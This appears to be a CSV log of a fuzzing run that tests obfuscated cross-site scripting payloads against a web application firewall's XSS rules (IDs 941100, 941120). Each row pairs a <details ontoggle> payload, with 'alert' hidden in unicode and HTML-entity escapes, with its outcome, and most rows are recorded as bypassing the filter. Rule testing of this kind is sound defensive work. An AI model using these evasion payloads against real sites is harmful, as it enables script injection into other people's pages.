382,"<details/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""/open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782692.658833
383,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""/open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782760.786673
384,"<details	ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""	open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782841.932396
388,"<details open	ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783115.089261
391,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""open>",0,1,bypass,2,"941100,941120","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783313.337665
392,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""class=x>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783447.310801
393,"<details open class=x ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783592.043061
395,"<details><details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878371.950412
396,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><summary>test</summary></details></details>",0,1,bypass,2,"941100,941120","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783845.840126
397,"<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details id=""inner""></details></details>",0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783976.373581
398,"<details><details><details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628784085.385384
400,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>",0,1,bypass,2,"941100,941120","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878416.338517
1001,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary>test</summary></details>,0,1,bypass,2,"941100,941120","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835476.894913
1002,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=y>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835513.182781
1003,"<details id=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835692.972393
1004,<details id=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835776.767357
1005,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>nested</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835855.797493
1006,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details>test</details></details>,0,1,bypass,2,"941100,941120","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835986.718742
1007,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><div>content</div></details>",0,1,bypass,2,"941100,941120","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836043.591154
1008,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary>x</summary></details>",0,1,bypass,2,"941100,941120","v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836067.414819
1009,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><p>test</p></details>,0,1,bypass,2,"941100,941120","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836199.707261
1010,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open class=x>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762883628.509693
1011,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open class=y>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836377.510412
1012,"<details class=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836498.577484
1013,<details class=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836577.637592
1014,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open>nested</details></details>",0,1,bypass,2,"941100,941120","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836674.451989
1020,"<details ontoggle=""Function(&#34;\u0061\u006c\u0065\u0072\u0074(1)&#34;)()"" open>",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837216.549323
1021,<details ontoggle=Function(&#34;\u0061\u006c\u0065\u0072\u0074(1)&#34;)() open>,0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837235.944395
1022,<details ontoggle=Function(&quot;&#92;u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837497.313677
1023,<details ontoggle=Function(&quot;\u0061&#92;u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837421.873770
1024,<details ontoggle=Function(&quot;\u0061\u006c&#92;u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837599.961797
1025,<details ontoggle=Function(&quot;\u0061\u006c\u0065&#92;u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837632.149548
1026,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072&#92;u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837734.761522
1055,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074&#40;1&#41;&quot;)() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628840344.342888
1056,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)&#40;&#41;"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884042.727173
1057,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)&#40;&#41; open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628840548.378715
1058,"<details ontoggle=""Function&#40;&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&#41;()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884061.600486
1059,<details ontoggle=Function&#40;&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&#41;() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884062.231139
1076,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details>x</details></details>",0,1,bypass,2,"941100,941120","v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842261.127500
1077,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details>y</details></details>,0,1,bypass,2,"941100,941120","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842311.329205
1078,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary>z</summary></details></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842453.149767
1079,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><summary>a</summary></details></details>,0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842539.145610
1080,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><summary>b</summary></details></details>",0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842667.193821
1081,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><summary>c</summary></details></details>,0,1,bypass,2,"941100,941120","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842716.526501
1082,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><div><details>d</details></div></details>",0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842749.791661
1083,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><div><details>e</details></div></details>,0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842897.001088
1084,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><span><details>f</details></span></details>",0,1,bypass,2,"941100,941120","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842936.269665
1085,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><span><details>g</details></span></details>,0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843033.151531
1086,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><p><details>h</details></p></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843177.665243
1087,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><p><details>i</details></p></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843247.621252
1088,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x><details>j</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884339.417813
1089,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=y><details>k</details></details>,0,1,bypass,2,"941100,941120","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843493.504541
1090,"<details id=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>l</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843523.340372
1091,<details id=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details>m</details></details>,0,1,bypass,2,"941100,941120","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843674.542651
1092,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open class=x><details>n</details></details>",0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843737.136600
1093,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open class=y><details>o</details></details>,0,1,bypass,2,"941100,941120","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843837.672159
1094,"<details class=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>p</details></details>",0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843916.932314
1095,<details class=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details>q</details></details>,0,1,bypass,2,"941100,941120","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844034.892061
1096,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open style=x><details>r</details></details>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,54v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628844110.948187
1097,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open style=y><details>s</details></details>,0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,52v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628844231.821564
1098,"<details style=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>t</details></details>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,15v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628844290.622725
1099,<details style=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details>u</details></details>,0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,15v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628844338.531848
1100,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details ontoggle=x>v</details></details>",0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844426.132749
1101,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details ontoggle=y>w</details></details>,0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844598.728886
1102,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open ontoggle=z>x</details></details>",0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844693.576572
1103,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open ontoggle=a>y</details></details>,0,1,bypass,2,"941100,941120","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844718.393150
1104,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details id=b>z</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844889.965626
1105,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details id=c>a</details></details>,0,1,bypass,2,"941100,941120","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628844929.794987
